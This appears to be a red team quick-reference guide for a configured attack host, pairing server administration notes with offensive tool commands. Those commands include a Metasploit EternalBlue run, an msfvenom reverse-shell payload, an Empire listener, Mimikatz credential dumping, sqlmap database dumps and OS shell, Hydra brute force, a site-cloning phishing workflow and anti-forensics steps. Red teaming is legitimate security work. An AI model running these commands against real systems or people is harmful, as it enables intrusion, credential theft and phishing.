# RED TEAM QUICK REFERENCE GUIDE
Generated: $(date)

## WIREGUARD VPN

### Installation and Setup
```bash
# Install WireGuard
sudo apt update && sudo apt install wireguard wireguard-tools

# Generate key pair
wg genkey | tee privatekey | wg pubkey > publickey

# Create interface configuration
sudo nano /etc/wireguard/wg0.conf
```

### Server Configuration Example
```
[Interface]
PrivateKey = <server_private_key>
Address = 10.0.0.1/24
ListenPort = 51820
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

[Peer]
PublicKey = <client_public_key>
AllowedIPs = 10.0.0.2/32
```

### Client Configuration Example
```
[Interface]
PrivateKey = <client_private_key>
Address = 10.0.0.2/24

[Peer]
PublicKey = <server_public_key>
Endpoint = server_ip:51820
AllowedIPs = 0.0.0.0/0
PersistentKeepalive = 25
```

### Management Commands
```bash
# Start/stop interface
sudo wg-quick up wg0
sudo wg-quick down wg0

# Check status
sudo wg show
sudo wg show wg0

# Add/remove peers dynamically
sudo wg set wg0 peer <public_key> allowed-ips 10.0.0.x/32

# Enable on boot
sudo systemctl enable wg-quick@wg0
```

## SSH SECURITY

### Hardening SSH Server
```bash
# Edit sshd_config
sudo nano /etc/ssh/sshd_config

# Key settings:
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding no
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server

# Restart SSH
sudo systemctl restart sshd
```

### SSH Key Management
```bash
# Generate Ed25519 key (preferred)
ssh-keygen -t ed25519 -C "your_email@example.com"

# Add key to agent
ssh-add ~/.ssh/id_ed25519

# Copy public key to server
ssh-copy-id user@server

# Test connection
ssh -T user@server
```

### SSH Config (~/.ssh/config)
```
Host server1
    HostName server.example.com
    User username
    IdentityFile ~/.ssh/id_ed25519
    Port 22
    StrictHostKeyChecking ask
    UserKnownHostsFile ~/.ssh/known_hosts
    ServerAliveInterval 60
    ServerAliveCountMax 3
```

## NETWORK SECURITY TOOLS

### Nmap Advanced Usage
```bash
# Service version detection with scripts
nmap -sV -sC -p- target.com

# OS detection
nmap -O target.com

# Aggressive scan
nmap -A target.com

# UDP scan
nmap -sU -p 53,67,68,69,123,161 target.com

# Firewall evasion
nmap -D RND:10 target.com
nmap --spoof-mac 0 target.com

# Output formats
nmap -oN output.txt target.com
nmap -oX output.xml target.com
```

### Wireshark/Tshark
```bash
# Capture on interface
sudo tshark -i eth0

# Filter by protocol
sudo tshark -i eth0 -f "tcp port 80"

# Decode as SSL
sudo tshark -i eth0 -d tcp.port==443,ssl

# Save capture
sudo tshark -i eth0 -w capture.pcap

# Read capture file
tshark -r capture.pcap -Y "http.request"
```

### Tcpdump
```bash
# Basic capture
sudo tcpdump -i eth0

# Capture specific port
sudo tcpdump -i eth0 port 80

# Capture with hex dump
sudo tcpdump -i eth0 -X port 80

# Save to file
sudo tcpdump -i eth0 -w capture.pcap

# Read from file
tcpdump -r capture.pcap
```

## WEB APPLICATION SECURITY

### Burp Suite (if installed)
```bash
# Start Burp
burpsuite

# Configure browser proxy
# Firefox: about:config -> network.proxy.*
# Set to 127.0.0.1:8080

# Intercept requests
# Use Proxy > Intercept tab
```

### SQLMap Advanced
```bash
# Basic injection test
sqlmap -u "http://target.com/page?id=1"

# POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=pass"

# Database enumeration
sqlmap -u "http://target.com/page?id=1" --dbs

# Table enumeration
sqlmap -u "http://target.com/page?id=1" -D database --tables

# Dump table
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

### Nikto Web Scanner
```bash
# Basic scan
nikto -h http://target.com

# Comprehensive scan
nikto -h http://target.com -C all

# Save output
nikto -h http://target.com -o output.txt
```

## EXPLOITATION FRAMEWORKS

### Metasploit (if installed)
```bash
# Start Metasploit
msfconsole

# Search exploits
search eternalblue

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50

# Run exploit
exploit

# Create payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > payload.exe
```

### Cobalt Strike (if available)
```bash
# Start team server
./teamserver <host> <password>

# Connect client
./cobaltstrike

# Generate beacon
# Use Attacks > Packages > Windows Executable
```

## POST-EXPLOITATION

### PowerShell Empire
```bash
# Start Empire
./empire

# Create listener
listeners
uselistener http
set Host http://your-ip:8080
execute

# Create stager
usestager multi/bash
set Listener http
execute
```

### Mimikatz (Windows)
```bash
# Dump credentials
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Pass-the-hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:hash" exit
```

## FORENSICS AND ANALYSIS

### Volatility (Memory Analysis)
```bash
# Basic analysis
volatility -f memory.dump imageinfo

# List processes
volatility -f memory.dump --profile=Win7SP1x64 pslist

# Dump process
volatility -f memory.dump --profile=Win7SP1x64 procdump -p 1234 -D .

# Hash dump
volatility -f memory.dump --profile=Win7SP1x64 hashdump
```

### Binwalk (Firmware Analysis)
```bash
# Extract firmware
binwalk -e firmware.bin

# Entropy analysis
binwalk -E firmware.bin

# Search for strings
binwalk -S firmware.bin
```

## SOCIAL ENGINEERING

### SET (Social Engineering Toolkit)
```bash
# Start SET
sudo setoolkit

# Credential harvester
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 4) Site Cloner
```

### GoPhish
```bash
# Start GoPhish
cd /opt/gophish
sudo ./gophish

# Access web interface
# https://localhost:3333
# Default: admin / gophish
```

## MOBILE SECURITY

### Android Tools
```bash
# ADB basic commands
adb devices
adb shell
adb pull /sdcard/file .
adb push file /sdcard/

# Frida (Dynamic analysis)
frida-ps -U  # List processes
frida-trace -U -f com.example.app -i "open"

# APK analysis
apktool d app.apk
jadx app.apk
```

## CLOUD SECURITY

### AWS Tools
```bash
# Configure AWS CLI
aws configure

# List S3 buckets
aws s3 ls

# Enumerate permissions
aws iam list-users
aws iam list-roles

# Scout Suite (AWS security audit)
scout aws
```

### Azure Tools
```bash
# Azure CLI
az login
az account list

# BloodHound (AD analysis)
# Import data with SharpHound
# Analyze with BloodHound GUI
```

## OPSEC (Operational Security)

### Traffic Obfuscation
```bash
# Proxychains
proxychains firefox

# Tor
torify curl https://check.torproject.org

# DNS over HTTPS
curl --doh-url https://1.1.1.1/dns-query https://example.com
```

### Anti-Forensics
```bash
# Shred files
shred -u -v -n 3 file.txt

# Wipe free space
dd if=/dev/zero of=/tmp/zero.fill bs=1M; rm /tmp/zero.fill

# Timestomp (change file timestamps)
touch -t 202001010000 file.txt
```

## DEVELOPMENT SECURITY

### Code Analysis
```bash
# Bandit (Python security)
bandit -r /path/to/code

# ESLint security plugins
npx eslint --ext .js,.jsx,.ts,.tsx src/

# Dependency check
npm audit
safety check  # Python
```

### Secure Coding
```bash
# Generate secure random
openssl rand -hex 32

# Hash passwords
python3 -c "import bcrypt; print(bcrypt.hashpw(b'password', bcrypt.gensalt()))"

# Encrypt files
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc
openssl enc -d -aes-256-cbc -in file.enc -out file.txt
```

## LOG ANALYSIS

### System Logs
```bash
# Auth logs
sudo tail -f /var/log/auth.log

# Syslog
sudo tail -f /var/log/syslog

# Journal
sudo journalctl -f

# Apache logs
sudo tail -f /var/log/apache2/access.log
sudo tail -f /var/log/apache2/error.log
```

### Log Analysis Tools
```bash
# GoAccess (web log analyzer)
goaccess /var/log/apache2/access.log

# Logwatch
sudo logwatch --detail High --mailto admin@example.com

# Rsyslog analysis
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr
```

### nginx
```bash
sudo systemctl start nginx       # Start nginx
sudo systemctl stop nginx        # Stop nginx
sudo systemctl restart nginx     # Restart nginx
sudo systemctl status nginx      # Check status
sudo nginx -t                    # Test configuration
```
Config: `/etc/nginx/nginx.conf`
Site configs: `/etc/nginx/sites-available/`

### Apache2
```bash
sudo systemctl start apache2     # Start Apache
sudo systemctl stop apache2      # Stop Apache
sudo systemctl restart apache2   # Restart Apache
sudo a2ensite sitename           # Enable site
sudo a2dissite sitename          # Disable site
```
Config: `/etc/apache2/apache2.conf`
Site configs: `/etc/apache2/sites-available/`

### Quick HTTP Servers
```bash
# Python
python3 -m http.server 8080

# Node.js
http-server -p 8080
live-server --port=8080

# PHP
php -S 0.0.0.0:8080
```

## DATABASE

### MariaDB
```bash
sudo systemctl start mariadb     # Start database
sudo mysql_secure_installation   # Secure installation
sudo mysql -u root -p            # Connect as root
```

## DOCKER

### Useful Containers
```bash
# Kali Linux
docker run -it kalilinux/kali-rolling

# Quick nginx
docker run -d -p 80:80 nginx

# Quick Apache
docker run -d -p 8080:80 httpd

# PHP development
docker run -d -p 8080:80 php:apache
```

## RED TEAM TOOLS

### GoPhish
```bash
cd /opt/gophish
sudo ./gophish
# Access: https://localhost:3333
# Default: admin/gophish
```

### Social Engineering Toolkit (SET)
```bash
sudo setoolkit
# or
cd /opt/setoolkit && sudo ./setoolkit
```

### HTTrack (Website Cloner)
```bash
httrack http://example.com -O /var/www/redteam/clones/example
httrack --mirror http://example.com
```

### Website Scraper (npm)
```bash
website-scraper http://example.com -d /var/www/redteam/clones/
```

## PYTHON SECURITY TOOLS

### Activate Virtual Environment
```bash
source /opt/redteam-venv/bin/activate
```

### Tools Available
- pwntools
- scapy
- impacket
- requests
- paramiko

## SSL/TLS CERTIFICATES

### Certbot (Let's Encrypt)
```bash
# nginx
sudo certbot --nginx -d domain.com

# Apache
sudo certbot --apache -d domain.com

# Standalone
sudo certbot certonly --standalone -d domain.com
```

### Self-Signed Certificate
```bash
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout /etc/ssl/private/selfsigned.key \
  -out /etc/ssl/certs/selfsigned.crt
```

## NETWORKING

### Port Scanning
```bash
nmap -sV -sC target.com          # Version detection + scripts
nmap -p- target.com              # All ports
masscan -p1-65535 target.com --rate=1000
```

### Network Monitoring
```bash
sudo tcpdump -i eth0             # Capture on eth0
sudo wireshark                   # GUI packet analyzer
```

### Proxies
```bash
proxychains4 firefox             # Route through proxy
ssh -D 9050 user@server          # SOCKS proxy
```

## WEB APPLICATION TESTING

### Directory Enumeration
```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
dirb http://target.com
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://target.com/FUZZ
```

### SQL Injection
```bash
sqlmap -u "http://target.com/page?id=1" --dbs
```

### Credential Attacks
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## DEPLOYMENT DIRECTORIES

```
/var/www/redteam/
├── phishing/     # Phishing page deployments
├── c2/           # C2 server web interfaces
├── payloads/     # Payload hosting
└── clones/       # Cloned websites

/opt/
├── gophish/      # GoPhish framework
├── setoolkit/    # Social Engineering Toolkit
└── redteam-venv/ # Python tools virtual environment
```

## NPM TOOLS

### Local Tunnel (Expose local server)
```bash
npx localtunnel --port 8080
```

### Ngrok (Alternative)
```bash
ngrok http 8080
```

### Process Manager
```bash
pm2 start app.js                 # Start application
pm2 list                         # List processes
pm2 stop all                     # Stop all
```

## QUICK PHISHING DEPLOYMENT

```bash
# 1. Clone target website
httrack http://target.com -O /var/www/redteam/clones/target

# 2. Modify for phishing
cd /var/www/redteam/phishing/
cp -r ../clones/target/* .
# Edit HTML/JS as needed

# 3. Deploy
# Option A: Quick test
http-server /var/www/redteam/phishing -p 8080

# Option B: nginx
sudo cp /var/www/redteam/phishing /var/www/html/
sudo systemctl start nginx

# Option C: GoPhish
cd /opt/gophish && sudo ./gophish
```

## WINDOWS SHARES

Mounted at:
- `/mnt/O`
- `/mnt/P`
- `/mnt/Q`
- `/mnt/R`
- `/mnt/S`
- `/mnt/T`

```bash
sudo mount -a                    # Mount all shares
mount | grep cifs                # List mounted shares
```

## USEFUL ALIASES TO ADD

Add to `~/.bashrc`:
```bash
alias serve='http-server -p 8080'
alias phpserve='php -S 0.0.0.0:8080'
alias pyserve='python3 -m http.server 8080'
alias redteam-venv='source /opt/redteam-venv/bin/activate'
alias scan='nmap -sV -sC'
alias dirscan='gobuster dir -u'
```

## LOGS AND TROUBLESHOOTING

```bash
# nginx logs
sudo tail -f /var/log/nginx/access.log
sudo tail -f /var/log/nginx/error.log

# Apache logs
sudo tail -f /var/log/apache2/access.log
sudo tail -f /var/log/apache2/error.log

# System logs
sudo journalctl -xe
sudo dmesg | tail

# Installation log
cat /tmp/baseinstall.log
```

## SECURITY NOTES

⚠️ **IMPORTANT**:
- All web servers are STOPPED by default
- Start them manually when needed
- Use SSL/TLS for external deployments
- Change default passwords (MariaDB, GoPhish, etc.)
- Keep Windows share credentials secure (`/root/.smbcredentials`)
- Use VPN/proxy for operational security
- Test in isolated environment first

